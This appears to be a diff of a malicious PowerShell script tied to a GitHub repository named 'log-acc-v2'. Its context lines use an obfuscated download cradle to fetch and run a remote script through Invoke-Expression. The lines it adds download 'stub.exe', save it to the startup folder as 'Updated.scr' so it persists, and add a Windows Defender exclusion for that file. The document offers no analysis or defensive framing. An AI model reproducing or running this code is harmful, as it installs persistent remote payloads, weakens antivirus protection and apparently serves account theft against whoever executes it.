@@ -9,3 +9,12 @@ $shellcode = ("https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/s
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
+$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/stub.exe"
+$output = "$startupfolder\Updated.scr"
+Add-MpPreference -ExclusionPath $output
+if (Test-Path -Path $output) {
+    Write-Host "hello"
+} else {
+    Invoke-WebRequest -Uri $url -OutFile $output
+}
+
